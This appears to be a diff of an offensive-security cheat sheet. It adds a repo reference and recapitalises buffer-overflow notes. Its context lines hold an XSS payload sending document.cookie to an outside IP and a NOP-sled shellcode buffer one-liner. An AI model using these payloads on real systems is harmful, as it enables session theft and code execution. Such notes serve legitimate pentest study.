@@ -1413,6 +1413,8 @@ Basic idea: upload an xml to test if it gets parsed and then abusing the doctype
 <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
 ```
 
+See Github Repo 'Redline'
+
 # Wifi Hacking
 
 ## WPS Pin Recovery
@@ -2737,9 +2739,9 @@ snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2
 ```
 
 # Buffer Overflow
-* check if you can write executable code in the stack with peda: ``checksec``. 
-* alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md
-* if NX is enabled writing shellcode into buffer will not execute
+* Check if you can write executable code in the stack with peda: ``checksec``. 
+* Alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md 
+* If NX is enabled writing shellcode into buffer will not execute
 
 ## Concept
 ```
@@ -2762,8 +2764,8 @@ ________________
 |              |
 ________________
 ```
-* try to exceed buffer and overwrite base pointers and return address
-* craft buffer according to the following concept 
+* Try to exceed buffer and overwrite base pointers and return address
+* Craft buffer according to the following concept 
 
 ```bash
 python -c 'print "\x90" * 470 + "<shellcode>" + "<memory address in middle of NOPs>" 
